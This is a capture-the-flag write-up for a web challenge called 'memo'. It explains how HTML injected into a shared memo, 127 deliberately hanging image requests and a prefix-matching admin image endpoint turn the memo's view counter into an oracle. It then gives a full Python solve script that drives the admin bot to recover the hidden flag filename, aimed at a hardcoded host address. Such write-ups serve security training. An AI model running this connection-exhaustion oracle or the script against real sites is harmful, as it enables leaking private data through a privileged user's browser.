# web/memo

## Overview

This challenge is a web challenge about recovering a secret image that only the admin can access.

The application stores images under `work/app/src/images/`, which includes the flag image. However, it is renamed to random garbage (`flag_<16 lowercase hex>.png`) at build time.

Looking at the application, it seems that users can upload memos and have the bot read them. When a memo was opened, the page's js will first load and render the memo as HTML, and then tell the server to increase the visitor count of the page. 

Furthurmore, I found that the images are accessible by the public as long as we have the exact filename. So the challenge is about finding the correct filename.

## Exploit Chain

1. Identify a way to validate our guess of the filename

   Inside of `/app/src/api/image/image.service.ts`, there is an interesting function `getAdminImagePath(filename)`. Compare to the normal `getImagePath(filename)` where an exact filename must be provided, this admin version lists the image directory and returns the first file whose name startsWith(filename) if no exact match is found.

   This allows us to reveal the filename character by character by ask the admin endpoint whether `flag_x`,  `flag_xx`,  `flag_xxx`, ... is a valid prefix, until we find the full name. The trade off is that we need to access this endpoint through the bot.

2. Find a way to leak the response of `getAdminImagePath`

   In `/app/src/public/js/memo-shared.js`, we can see the following this happen when a visitor opens a memo:

   - It fetches `/api/memo/shared/<key>`.
   - It injects the memo HTML into the page (which we can load images here)
   - Then it waits `500ms`.
   - Then it POSTs `/api/memo/<id>/view`.

   So if we can block that final `/view` POST in the “wrong prefix” case using some image loading techniques, then the memo’s public `views` counter becomes our oracle.

3. Block the `/view` POST when perfix is wrong

   In `/app/src/api/image/image.controller.ts`, we noticed that both image handlers do the following:
   
   ```ts
   @Get('/')
   async getImage(
       @Query('filename') filename: string,
       @Res() res: Response
   ): Promise<void> {
       if (!filename) throw new HttpException('filename is required.', 400);

       const imagePath = this.imageService.getImagePath(filename);
       if (!imagePath) return;

       return res.sendFile(imagePath);
   }
   ```

   Because `@Res()` is used directly, “return with no response” leaves the HTTP request hanging instead of returning a normal `404`. That means, a missing image request will stay open and consumes one browser HTTP/2 stream, and enough hanging image requests will block later requests, including the memo’s final `/view` POST.

4. Turn that into an oracle.

   With some local testings, it's not hard to find that `128` hanging image requests are enough to block the later `/view` POST for this challenge setup, while `127` hanging requests are not.

   So if we can build a memo with `127` hanging public image misses and `1` image request to the admin endpoint using our prefix, then each visit will result in either one of these:

   - If the prefix is wrong:
     - the admin image endpoint returns none, all `128` image requests hang, `/view` is blocked
     - memo `views` stays `0`
   - If the prefix is right:
     - the admin image endpoint returns quickly, only `127` requests remain hanging, and `/view` succeeds
     - memo `views` becomes nonzero

   This confirms whether the next digit is `x`, a given digit. But testing one by one is slow. Let's use binary search to reduce the searches needed for each hex char.

   For `k` candidate to be tested, we build the memo with  `128 - k` hanging public image misses and `k` admin candidate images, one for each possible next digit. Now each hex digit takes `4` queries instead of up to `16`.

5. Recover the full filename, then use the public image endpoint.

   Once the exact suffix is known, the file becomes public again because according to `/app/src/api/image/image.controller.ts`, `GET /api/image/` is public as long as we can provide the EXACT file name.

   For the live instance we solved, the recovered filename was `flag_5bf617256c6f1a3b.png`

## Final Solve

```python
#!/usr/bin/env python3
import argparse
import random
import string
import sys
import time
import urllib3
from pathlib import Path

import requests


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


HEX_DIGITS = "0123456789abcdef"


def rand_text(length: int = 8) -> str:
    chars = string.ascii_lowercase + string.digits
    return "".join(random.choice(chars) for _ in range(length))


class MemoClient:
    def __init__(self, host: str):
        self.host = host
        self.base = f"https://{host}"
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({"User-Agent": "memo2-solver/1.0"})

    def post_json(self, path: str, body: dict, timeout: int = 20) -> dict:
        response = self.session.post(
            self.base + path,
            json=body,
            timeout=timeout,
        )
        response.raise_for_status()
        if not response.text:
            return {}
        return response.json()

    def get_json(self, path: str, timeout: int = 20) -> dict:
        response = self.session.get(self.base + path, timeout=timeout)
        response.raise_for_status()
        if not response.text:
            return {}
        return response.json()

    def register_and_login(self) -> None:
        username = f"solver_{rand_text()}"
        password = "p"
        body = {"username": username, "password": password, "name": "x"}
        self.post_json("/api/auth/register", body)
        self.post_json("/api/auth/login", {"username": username, "password": password})

    def create_memo(self, title: str, content: str) -> str:
        self.post_json("/api/memo", {"title": title, "content": content})
        listing = self.get_json("/api/memo")
        for memo in listing.get("data", []):
            if memo.get("title") == title:
                return memo["_id"]
        raise RuntimeError(f"memo not found after create: {title}")

    def share_memo(self, memo_id: str) -> str:
        result = self.post_json(f"/api/memo/{memo_id}/share", {})
        key = result.get("data", {}).get("sharedKey")
        if not key:
            raise RuntimeError(f"share key missing for memo {memo_id}")
        return key

    def get_views(self, memo_id: str) -> int:
        result = self.get_json(f"/api/memo/{memo_id}")
        return int(result["data"]["views"])

    def download_flag_image(self, filename: str, output: Path) -> None:
        response = self.session.get(
            f"{self.base}/api/image/?filename={filename}",
            timeout=20,
        )
        response.raise_for_status()
        output.write_bytes(response.content)


class BotClient:
    def __init__(self, bot_host: str):
        self.bot_host = bot_host
        self.base = f"http://{bot_host}:5000"
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "memo2-solver/1.0"})

    def report(self, url: str, timeout: int = 20) -> None:
        response = self.session.post(
            self.base + "/report",
            json={"url": url},
            timeout=timeout,
        )
        response.raise_for_status()


def make_grouped_content(prefix: str, subset: list[str], nonce: str) -> str:
    candidates = "".join(
        f'<img src="/api/image/admin?filename=flag_{prefix}{digit}">'
        for digit in subset
    )
    filler_count = 128 - len(subset)
    fillers = "".join(
        f'<img src="/api/image/?filename=miss_{nonce}_{i}.png">'
        for i in range(filler_count)
    )
    return candidates + fillers


def make_verify_content(prefix: str, nonce: str) -> str:
    candidate = f'<img src="/api/image/admin?filename=flag_{prefix}">'
    fillers = "".join(
        f'<img src="/api/image/?filename=verify_{nonce}_{i}.png">'
        for i in range(127)
    )
    return candidate + fillers


def create_shared_memo(client: MemoClient, content: str) -> tuple[str, str]:
    title = f"oracle_{rand_text(12)}"
    memo_id = client.create_memo(title, content)
    key = client.share_memo(memo_id)
    return memo_id, key


def run_oracle(
    memo_client: MemoClient,
    bot_client: BotClient,
    content: str,
    reports: int,
    wait_seconds: float,
) -> bool:
    memo_id, key = create_shared_memo(memo_client, content)
    url = f"https://nginx/memo/shared?key={key}"
    for _ in range(reports):
        bot_client.report(url)
        time.sleep(1.2)
    time.sleep(wait_seconds)
    return memo_client.get_views(memo_id) > 0


def extract_suffix(
    memo_client: MemoClient,
    bot_client: BotClient,
    grouped_reports: int,
    verify_reports: int,
    grouped_wait: float,
    verify_wait: float,
    start_prefix: str = "",
) -> str:
    prefix = start_prefix
    for _ in range(len(start_prefix), 16):
        candidates = list(HEX_DIGITS)
        while len(candidates) > 1:
            half = len(candidates) // 2
            subset = candidates[:half]
            content = make_grouped_content(prefix, subset, rand_text(8))
            hit = run_oracle(
                memo_client,
                bot_client,
                content,
                grouped_reports,
                grouped_wait,
            )
            print(
                f"[oracle] prefix={prefix or '(root)'} subset={''.join(subset)} hit={hit}",
                flush=True,
            )
            if hit:
                candidates = subset
            else:
                candidates = candidates[half:]
        prefix += candidates[0]
        verify_content = make_verify_content(prefix, rand_text(8))
        verified = run_oracle(
            memo_client,
            bot_client,
            verify_content,
            verify_reports,
            verify_wait,
        )
        print(f"[verify] flag_{prefix} -> {verified}", flush=True)
        if not verified:
            raise RuntimeError(f"prefix verification failed for flag_{prefix}")
        print(f"[prefix] {prefix}", flush=True)
    return prefix


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Solve Memo2 by extracting the randomized flag filename.",
    )
    parser.add_argument(
        "--host",
        default="3.38.205.243",
        help="Web host with a working internal nginx mapping.",
    )
    parser.add_argument(
        "--bot",
        default="3.38.205.243",
        help="Bot host whose :5000 report service maps to the same internal nginx.",
    )
    parser.add_argument(
        "--grouped-reports",
        type=int,
        default=3,
        help="How many times to submit each grouped oracle URL.",
    )
    parser.add_argument(
        "--verify-reports",
        type=int,
        default=2,
        help="How many times to submit each exact-prefix verification URL.",
    )
    parser.add_argument(
        "--grouped-wait",
        type=float,
        default=20.0,
        help="Seconds to wait before reading views for grouped oracle memos.",
    )
    parser.add_argument(
        "--verify-wait",
        type=float,
        default=18.0,
        help="Seconds to wait before reading views for exact-prefix verification memos.",
    )
    parser.add_argument(
        "--start-prefix",
        default="",
        help="Resume from an already known hexadecimal suffix prefix.",
    )
    parser.add_argument(
        "--output",
        default="flag.png",
        help="Where to save the downloaded flag image.",
    )
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    memo_client = MemoClient(args.host)
    bot_client = BotClient(args.bot)

    print(f"[setup] host={args.host} bot={args.bot}", flush=True)
    memo_client.register_and_login()

    suffix = extract_suffix(
        memo_client=memo_client,
        bot_client=bot_client,
        grouped_reports=args.grouped_reports,
        verify_reports=args.verify_reports,
        grouped_wait=args.grouped_wait,
        verify_wait=args.verify_wait,
        start_prefix=args.start_prefix,
    )

    filename = f"flag_{suffix}.png"
    output = Path(args.output)
    memo_client.download_flag_image(filename, output)
    print(f"[done] filename={filename}", flush=True)
    print(f"[done] saved image to {output}", flush=True)
    print("[done] open the saved image to read the flag text.", flush=True)
    return 0


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except KeyboardInterrupt:
        print("\n[!] interrupted", file=sys.stderr)
        raise SystemExit(130)
```

Run it:

```bash
python3 ./solve.py
```
